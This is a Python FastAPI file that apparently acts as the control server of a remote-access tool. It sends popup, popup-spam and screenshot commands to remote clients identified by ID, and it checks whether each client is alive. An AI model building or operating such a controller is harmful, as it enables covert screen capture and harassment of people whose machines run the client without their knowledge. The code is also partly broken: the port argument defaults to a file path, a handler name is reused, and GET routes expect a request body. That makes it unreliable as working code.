import argparse
from pathlib import Path

import uvicorn
from fastapi import FastAPI

import configurator
from commands import PopupCommand, PopupParameters, BasicCommand, CommandType
from protocol.requests import RequestHeader, RequestType, SendCommandRequest, SendCommandContent
from protocol.responses import BasicResponse, SendCommandResponse

argument_parser = argparse.ArgumentParser()
argument_parser.add_argument("-c", "--config", default="../conf.json", type=Path, help="Path to config file")
argument_parser.add_argument("-p", "--port", default="../conf.json", type=int,
                             help="Port to listen for api requests on")
args = argument_parser.parse_args()

app = FastAPI()
server = configurator.parse(args.config)


@app.get("/")
def make_command_request(request: SendCommandRequest) -> SendCommandResponse:
    return server.handle_send_command(request)


@app.get("/popup")
def send_popup_command(client_id: str, message: str) -> BasicResponse:
    return make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(
                command=PopupCommand(
                    parameters=PopupParameters(
                        message=message
                    )
                )
            )
        )
    )


@app.get("/popup-spam")
def send_popup_spam_command(client_id: str, message: str) -> BasicResponse:
    return make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(
                command=PopupCommand(
                    command_type=CommandType.PopupSpam,
                    parameters=PopupParameters(
                        message=message
                    )
                )
            )
        )
    )


@app.get("/screenshot")
def send_popup_command(client_id: str) -> BasicResponse:
    return make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(command=BasicCommand(command_type=CommandType.Screenshot))
        )
    )


@app.get("/is-alive")
def is_alive(client_id: str) -> BasicResponse:
    return server.is_alive(client_id)


if __name__ == '__main__':
    uvicorn.run(app, host="0.0.0.0", port=args.port)